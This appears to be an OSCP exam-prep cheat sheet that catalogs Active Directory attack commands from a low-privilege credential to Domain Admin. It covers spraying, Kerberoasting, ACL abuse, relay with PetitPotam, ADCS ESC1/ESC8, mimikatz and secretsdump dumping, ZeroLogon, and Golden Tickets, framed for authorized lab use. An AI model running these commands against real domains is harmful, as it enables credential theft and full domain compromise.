# AD Assumed-Breach Methods Catalog — Every Path From a Low-Priv Credential to DA

*The dense command reference for the OSCP Active Directory set. Where
[`ad-methodology-end-to-end.md`](ad-methodology-end-to-end.md) is the **sequencing layer** (what to try,
in what order, and why), this file is the **catalog layer**: every assumed-breach method in one
scannable sheet, each as a copy-paste one-liner with when-to-use and expected yield, so when the clock
is running you work down a list instead of flipping through six files. Authoritative depth for each
technique still lives in the per-topic deep-dives — follow the → pointer. For authorized OSCP exam/lab
use only.*

> **Helper script:** [`scripts/ad-enum.sh`](../scripts/README.md) runs most of sections A, C, F, G
> below in one command and hands you hashcat-ready files. It **harvests and stops** — you make every
> cracking and exploitation decision. See the scripts README's "are these exam-legal?" note.

**Placeholder convention:** `$DC_IP` = domain controller IP, `$DOMAIN` = FQDN (e.g. `corp.local`),
`$USER`/`$PASS` = your current credential, `$NT` = an NTLM hash, `$TARGET` = the box you're attacking.
Commands assume Kali's `impacket-*` / `nxc` (NetExec) naming.

---

## 0. Why people fail the AD set (and how this catalog fixes it)

Across retake write-ups the failure is almost never *not knowing a technique* — it's **speed and
sequencing**. The candidate who failed at 3.5h to SYSTEM passes the retake at 2.5h on the same box.
The fixes, distilled:

- **Enumerate once, thoroughly, then commit to the shortest path.** The #1 time sink is re-enumerating
  because you didn't capture everything the first pass. Run section A in full, read the BloodHound
  graph *once*, pick the shortest path to DA, and execute it — don't shop for the most interesting
  technique.
- **Time-box every technique.** If a path hasn't produced a new credential/foothold in ~20–30 min,
  park it and try the next item in the catalog. Rabbit holes lose AD sets.
- **Credential reuse is reflexive.** The moment you get *any* new secret (cracked hash, reset password,
  LAPS read, GPP cpassword), spray it across every host and protocol (section D) *before* anything
  else — AD sets are won by one credential working somewhere unexpected.
- **Feed every new principal back into enumeration.** A new cred often opens BloodHound edges that
  weren't visible before. New secret → re-mark Owned → re-query → then act.
- **Have tooling pre-staged and tested.** BloodHound/neo4j crashing mid-exam is a classic time sink —
  know your backup (see §0.1). Don't troubleshoot tools on exam day.
- **Bank partial credit.** The AD set awards points per stage now — capture proof at *every* new level
  of access (see §M and [`EXAM-TIPS.md`](../EXAM-TIPS.md) §3), not just at DA.

### 0.1 Pre-exam tooling checklist (test these the week before, not on exam day)

- [ ] **BloodHound CE + neo4j** start cleanly and ingest a test zip. Know the restart incantation.
      Backup plan if it won't cooperate: `bloodhound-python` still *collects* fine; you can read
      `--users`/`--groups`/ACLs from `nxc`/`ldapsearch` manually, and `certipy find` for ADCS.
- [ ] **Impacket** suite callable (`impacket-GetUserSPNs`, `-secretsdump`, `-psexec`, `-wmiexec`,
      `-getTGT`, `-ticketer`, `-ntlmrelayx`).
- [ ] **NetExec** (`nxc`) with the modules you'll use (`gpp_password`, `gpp_autologin`, `laps`, `adcs`).
- [ ] **certipy-ad**, **evil-winrm**, **hashcat** (+ rockyou unzipped + `OneRuleToRuleThemAll.rule`).
- [ ] **ligolo-ng** `proxy`/`agent` binaries downloaded (both Linux `agent` and `agent.exe`) — see
      [`scripts/ligolo-setup.sh`](../scripts/README.md), one command to a fully-routed pivot.
- [ ] A username wordlist and your spray password list staged.

---

## A. First contact — the credential works, map everything (do ALL of this, once)

| When | Command | Yield |
|---|---|---|
| Always, minute one | `nxc smb $DC_IP -u $USER -p $PASS` | Confirms cred live, domain/host names, SMB signing |
| Always | `nxc smb $DC_IP -u $USER -p $PASS --users --groups --pass-pol --shares --loggedon-users` | User/group list, **lockout threshold** (before any spray), shares, who's logged on where |
| Always (graph) | `bloodhound-python -c all -u $USER -p $PASS -d $DOMAIN -ns $DC_IP --zip` | Full collection → ingest → shortest-path queries |
| RID cycling | `nxc smb $DC_IP -u $USER -p $PASS --rid-brute` | Users BloodHound's default collection can miss |
| Manual LDAP sanity check | `nxc ldap $DC_IP -u $USER -p $PASS --query "(objectClass=user)" "sAMAccountName description"` | Catches **description-field passwords** BloodHound ignores |
| Kerberoastable at a glance | `nxc ldap $DC_IP -u $USER -p $PASS --kerberoasting kerb.hash` | Writes mode-13100 hashes directly |
| AS-REP at a glance | `nxc ldap $DC_IP -u $USER -p $PASS --asreproast asrep.hash` | Mode-18200 hashes for no-preauth accounts |

→ Deep-dive: [`service-enumeration-comprehensive.md`](service-enumeration-comprehensive.md) (LDAP/SMB),
[`ad-delegation-trust-bloodhound.md`](ad-delegation-trust-bloodhound.md) §1 (BloodHound).
**Fallback if LDAP is firewalled:** `rpcclient -U '$USER%$PASS' $DC_IP`, `impacket-lookupsid`,
`nxc smb --rid-brute` (port 445 path, not 389).

---

## B. Creds lying in the open (cheap, high-hit — check before anything hard)

| Method | Command | Yield |
|---|---|---|
| **GPP cpassword** (SYSVOL) | `nxc smb $DC_IP -u $USER -p $PASS -M gpp_password` | AES-decryptable local-admin password, instant DA-adjacent on old domains |
| GPP autologin | `nxc smb $DC_IP -u $USER -p $PASS -M gpp_autologin` | Plaintext autologon creds in SYSVOL |
| **LAPS** read | `nxc ldap $DC_IP -u $USER -p $PASS --laps` | Local admin password of boxes you can read LAPS on |
| Description fields | (LDAP query in §A) or BloodHound node info | Passwords admins stashed in `description`/`info` |
| Share hunting | `nxc smb $DC_IP -u $USER -p $PASS -M spider_plus` / `manual smbclient` | Config files, scripts, `unattend.xml`, creds in shares |
| Snaffler (Windows foothold) | `Snaffler.exe -s -o snaffler.log` | Automated secret-in-share finder |

→ Deep-dive: [`ad-domain-privesc-cves.md`](ad-domain-privesc-cves.md) (GPP),
[`ad-delegation-trust-bloodhound.md`](ad-delegation-trust-bloodhound.md) (LAPS).

---

## C. Roasting (no ACL needed — always worth running)

| Method | Command | Yield / crack |
|---|---|---|
| **Kerberoast** | `impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC_IP -request -outputfile kerb.hash` | Any SPN account → `hashcat -m 13100` |
| AS-REP roast | `impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -dc-ip $DC_IP -format hashcat -outputfile asrep.hash` | No-preauth accounts → `hashcat -m 18200` |
| AS-REP (authed, broader) | `nxc ldap $DC_IP -u $USER -p $PASS --asreproast asrep.hash` | Same, across all eligible accounts |
| **Targeted Kerberoast** (you hold GenericWrite over a user) | set a fake SPN, roast, remove SPN — see §E `GenericWrite` | Crack a user whose SPN you planted |
| **Timeroast** (fully unauth) | `python3 timeroast.py $DC_IP -o timeroast.hash` → `hashcat -m 31300 --username` | Computer-account hashes; rarely cracks but free |

→ Deep-dive: [`password-attacks-advanced.md`](password-attacks-advanced.md),
[`ad-methodology-end-to-end.md`](ad-methodology-end-to-end.md) §2 (Timeroast expectations).
Crack with [`scripts/crack.sh`](../scripts/README.md): `./crack.sh kerb.hash --rules`.

---

## D. Password attacks & reuse (do this on EVERY new secret, immediately)

| Method | Command | Note |
|---|---|---|
| **Spray** (respect lockout!) | `nxc smb $DC_IP -u users.txt -p 'Season2026!' --continue-on-success` | One password, whole list; check `--pass-pol` first |
| Reuse across protocols | `nxc smb $TARGET -u $USER -p $PASS` then `winrm`/`rdp`/`mssql`/`ssh` | A cred valid on SMB may be admin on WinRM elsewhere |
| Reuse by hash (PtH) | `nxc smb $TARGET -u $USER -H $NT` | Cracking not required to move |
| Crack offline | `hashcat -m <mode> hash /usr/share/wordlists/rockyou.txt -r OneRuleToRuleThemAll.rule` | Modes: [`CHEATSHEET.md`](../CHEATSHEET.md) §4 |
| Sweep a cred everywhere | [`scripts/hashid-credcheck.sh`](../scripts/README.md)` cred $TARGET $USER $PASS_or_HASH` | Highlights `(Pwn3d!)` admin hits |

→ Deep-dive: [`password-attacks-advanced.md`](password-attacks-advanced.md).
**Exam-safe note:** spraying with known/guessed passwords is fine; **Responder/mitm6 are NOT** — that's
name-resolution spoofing, which the exam bans (§ exam-safety below).

---

## E. ACL / DACL abuse — keyed by the exact BloodHound edge

Pick the edge BloodHound drew; run its recipe. All of these turn a *write right* into a credential.

| Edge | What to run | Result |
|---|---|---|
| **GenericAll / GenericWrite on a user** | Targeted Kerberoast: `targetedKerberoast.py -v -d $DOMAIN -u $USER -p $PASS` (sets temp SPN, roasts, cleans up) | Crackable TGS for that user |
| GenericAll/GenericWrite on a user (alt) | `net rpc password "victim" "NewPass123!" -U "$DOMAIN/$USER%$PASS" -S $DC_IP` | Reset the victim's password |
| **ForceChangePassword** | `bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC_IP set password victim 'New123!'` or `net rpc password victim 'New123!' -U "$DOMAIN/$USER%$PASS" -S $DC_IP` | You own the victim account |
| **AddMember** (over a group) | `bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC_IP add groupMember "Target Group" $USER` | Add yourself to a privileged group |
| **WriteDACL** (over domain/object) | `impacket-dacledit -action write -rights DCSync -principal $USER -target-dn "$DOMAIN_DN" $DOMAIN/$USER:$PASS` | Grant yourself **DCSync** → §M |
| **WriteOwner** | `impacket-owneredit -action write -new-owner $USER -target victim ...` then grant yourself rights | Take ownership, then abuse |
| **GenericAll on a computer** | Write RBCD or Shadow Credentials — see §F | Impersonate on that computer |
| **ReadGMSAPassword** | `nxc ldap $DC_IP -u $USER -p $PASS --gmsa` | gMSA NT hash → PtH |
| **AddKeyCredentialLink** (Shadow Creds) | `certipy shadow auto -u $USER@$DOMAIN -p $PASS -account victim` | PKINIT → victim's NT hash + TGT |

→ Deep-dive: [`ad-delegation-trust-bloodhound.md`](ad-delegation-trust-bloodhound.md) "ACL Abuse —
Exploiting BloodHound Edges".

---

## F. Delegation abuse

| Type | Detect | Exploit |
|---|---|---|
| **Unconstrained** | `nxc ldap $DC_IP -u $USER -p $PASS --trusted-for-delegation` | Compromise the host, coerce a DC to auth to it, capture its TGT (`Rubeus monitor`/`krbrelayx`) |
| **Constrained** | BloodHound `AllowedToDelegate` | `impacket-getST -spn cifs/$TARGET -impersonate Administrator $DOMAIN/svc:$PASS` → PtT |
| **RBCD** (you can write the target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity`) | GenericWrite/GenericAll on a computer | `impacket-addcomputer` (add a machine acct) → `impacket-rbcd -delegate-to $TARGET -action write` → `impacket-getST -spn cifs/$TARGET -impersonate Administrator` |
| **Shadow Credentials** (write `msDS-KeyCredentialLink`) | GenericWrite on user/computer | `certipy shadow auto` (§E) |

→ Deep-dive: [`ad-delegation-trust-bloodhound.md`](ad-delegation-trust-bloodhound.md) §2.

---

## G. ADCS — check early, often the single fastest route to DA

| Step | Command |
|---|---|
| **Find vulnerable templates** (do this in parallel with §A) | `certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP -vulnerable -stdout` |
| Fast triage | `nxc ldap $DC_IP -u $USER -p $PASS -M adcs` |
| **ESC1** (enrollee-supplies-subject) | `certipy req -u $USER@$DOMAIN -p $PASS -ca <CA> -template <tmpl> -upn administrator@$DOMAIN` → `certipy auth -pfx administrator.pfx` → NT hash + TGT |
| ESC3 (enrollment agent) | request agent cert, then request on-behalf-of a DA |
| ESC4 (template ACL) | rewrite the template to be ESC1, then ESC1 |
| **ESC8** (HTTP enrollment relay) | `impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController` + coerce (§H) |

→ Deep-dive: [`adcs-certipy-cheatsheet.md`](adcs-certipy-cheatsheet.md) (ESC1–ESC8 table + ESC9–ESC16).

---

## H. Coercion + NTLM relay (when you hold no ACL/delegation edge)

Coercion (forcing a machine to authenticate) **is** exam-safe; it is *not* spoofing. The banned thing
is name-resolution poisoning (Responder/mitm6). Relaying a coerced auth is standard technique.

| Step | Command |
|---|---|
| Check relay targets (signing off) | `nxc smb <subnet>/24 -u $USER -p $PASS --gen-relay-list relay.txt` |
| Start relay → LDAP (RBCD) | `impacket-ntlmrelayx -t ldap://$DC_IP --delegate-access -smb2support` |
| Start relay → ADCS (ESC8) | `impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp --adcs -smb2support` |
| **Coerce** (pick what's exposed) | `python3 PetitPotam.py -u $USER -p $PASS <attacker_ip> $TARGET` · PrinterBug (`dementor.py`) · `coercer coerce ...` |

→ Deep-dive: [`ad-coercion-and-relay.md`](ad-coercion-and-relay.md).

---

## I. Local privesc on a client box → then harvest

If your best foothold is a low-priv shell on one of the two clients, get SYSTEM/root locally first — it
unlocks LSASS and cached creds (§J).

- **Windows:** `winPEASx64.exe` → service/task misconfig, **SeImpersonate → PrintSpoofer/GodPotato**,
  unquoted paths, AlwaysInstallElevated. → [`windows-privesc-scripts.md`](windows-privesc-scripts.md).
- **Linux:** `linpeas.sh -a` → sudo rules (GTFOBins), SUID, capabilities, cron/PATH.
  → [`linux-privesc-advanced.md`](linux-privesc-advanced.md).
- Stage the enumerator with [`scripts/privesc-launcher.sh`](../scripts/README.md).
- **Don't** burn your one Metasploit machine on an AD-set box — those are excluded from the allowance.

---

## J. Credential harvesting (the highest-value 5 min after any local admin)

| Source | Command |
|---|---|
| **Remote dump** (you have admin creds/hash) | `impacket-secretsdump $DOMAIN/$USER:$PASS@$TARGET` (or `-hashes :$NT`) |
| LSASS in-session (Windows) | `mimikatz # sekurlsa::logonpasswords` / `privilege::debug` |
| SAM + LSA secrets | part of secretsdump local, or `reg save` + offline |
| DPAPI / browser creds | `mimikatz # dpapi::` , `SharpChrome` |
| Linux loot | configs, `.bash_history`, keys, in-memory → [`credentials-harvesting-post-exploitation.md`](credentials-harvesting-post-exploitation.md) |

Every new box is a new LSASS — dump it before moving on. Feed every secret back into §D.

---

## K. Lateral movement (pick by what you're carrying)

| You hold | Move with |
|---|---|
| Password or **NT hash** (+ local admin on target) | `evil-winrm -i $TARGET -u $USER -H $NT` · `impacket-wmiexec -hashes :$NT $DOMAIN/$USER@$TARGET` · `impacket-psexec` |
| Prefer quiet/interactive | **evil-winrm** (no service dropped) or **wmiexec** over psexec |
| NT hash, NTLM blocked/monitored | **Overpass-the-hash**: `impacket-getTGT -hashes :$NT $DOMAIN/$USER` → `export KRB5CCNAME=` → `-k -no-pass` |
| A Kerberos **ticket** | **Pass-the-ticket**: `export KRB5CCNAME=ticket.ccache; impacket-psexec -k -no-pass $DOMAIN/$USER@$TARGET` |
| `.kirbi` (Windows) → Linux | `impacket-ticketConverter ticket.kirbi ticket.ccache` |

Note: `wmiexec`/`psexec` PtH use NTLM; against Kerberos-only targets use overpass-the-hash or PtT.
→ Deep-dive: [`windows-lateral-movement-persistence.md`](windows-lateral-movement-persistence.md).

---

## L. Domain-privesc CVEs (check build numbers early — can skip the whole graph)

| CVE | When | Command sketch |
|---|---|---|
| **ZeroLogon** (CVE-2020-1472) | DC unpatched pre-Aug-2020 | `zerologon` PoC → empties DC machine pwd → DCSync. **Restore the pwd after** or you break the DC |
| **noPac** (CVE-2021-42278/42287) | `MachineAccountQuota`>0, pre-Nov-2021 | `impacket-addcomputer` + `noPac.py` → impersonate DA |
| **Certifried** (CVE-2022-26923) | ADCS present | certipy with a machine acct whose dNSHostName you control |
| PrintNightmare (CVE-2021-1675) | Spooler up, old | local/remote SYSTEM on a client |
| DNSAdmins | member of DNSAdmins | load a malicious DLL into DNS service → SYSTEM on DC |

→ Deep-dive: [`ad-domain-privesc-cves.md`](ad-domain-privesc-cves.md) (incl. ZeroLogon cleanup step).

---

## M. The payoff — DCSync, Golden Ticket, trusts

| Step | Command |
|---|---|
| **DCSync** (DA or replication rights) | `impacket-secretsdump -just-dc $DOMAIN/$USER:$PASS@$DC_IP` (or `-just-dc-user krbtgt`) |
| Note for re-entry | Save the **domain SID** and **krbtgt** NT hash somewhere durable |
| **Golden Ticket** (insurance) | `impacket-ticketer -nthash <krbtgt> -domain-sid <SID> -domain $DOMAIN administrator` → `export KRB5CCNAME=` → use |
| Silver Ticket (one service) | `impacket-ticketer -spn <service> -nthash <svc_hash> ...` |
| **Cross-trust** (child DA → parent EA) | enumerate trust first; then Golden Ticket **with ExtraSIDs** (SID history) |

**Capture proof at every stage above, not just here** — initial access, each cracked cred, each local
admin, each lateral hop, the DCSync. `proof.txt`/`local.txt` **must** be read via an interactive shell
on the box itself (reading it over SMB/a relayed command zeroes that machine's points).
→ [`EXAM-TIPS.md`](../EXAM-TIPS.md) §3, [`ad-methodology-end-to-end.md`](ad-methodology-end-to-end.md) §14.

---

## N. Pivoting between the AD subnets

The AD set usually sits on an internal segment you reach through your first foothold. One command to a
fully-routed ligolo pivot (auto VPN-IP, pre-staged route, agent served over the VPN):

```bash
./scripts/ligolo-setup.sh --route <internal_subnet>/24 --serve
```

→ Deep-dive: [`pivoting-tunneling.md`](pivoting-tunneling.md), [`scripts/README.md`](../scripts/README.md).

---

## Exam-safety reminders (the ways to lose AD points to *rules*, not skill)

- **No spoofing.** Responder, mitm6, Ettercap, arp/DNS/NBNS poisoning are **banned**. Coercion
  (PetitPotam/PrinterBug) is fine — it's not spoofing. See [`EXAM-TIPS.md`](../EXAM-TIPS.md).
- **No Metasploit on the AD set.** The one-machine MSF allowance excludes AD boxes entirely.
- **No auto-exploitation frameworks.** These harvesting commands are fine; `db_autopwn`-style
  find-and-fire tools are not. See [`scripts/README.md`](../scripts/README.md)'s scope note.
- **Proof per stage, interactive read.** Partial credit only counts if it's documented correctly.

---

## 60-second "what do I try next?" — keyed on what you hold

- **Just the breach cred** → §A (map it all) → read BloodHound → shortest path.
- **A BloodHound ACL edge** → §E (match the edge exactly).
- **A delegation edge** → §F.
- **ADCS present** → §G (run `certipy find` in parallel with everything).
- **A new secret (any kind)** → §D reuse sweep *first*, then re-enumerate.
- **Low-priv shell on a client** → §I local privesc → §J harvest.
- **Local admin on a box** → §J dump → §K move.
- **No edge, signing off somewhere** → §H coerce + relay.
- **Old DC/domain build** → §L CVE fast-path.
- **DA or DCSync rights** → §M (dump, Golden Ticket, proof).
- **Stuck > 30 min on one path** → park it, next catalog item. Don't rabbit-hole.

---

*Sources & further reading:* this catalog consolidates the per-topic deep-dives linked throughout,
plus current (2026) community methodology. Verify any flag against the tool's own `--help` and the
official OSCP exam guide before exam day — tool syntax (nxc, certipy, impacket) drifts between versions.
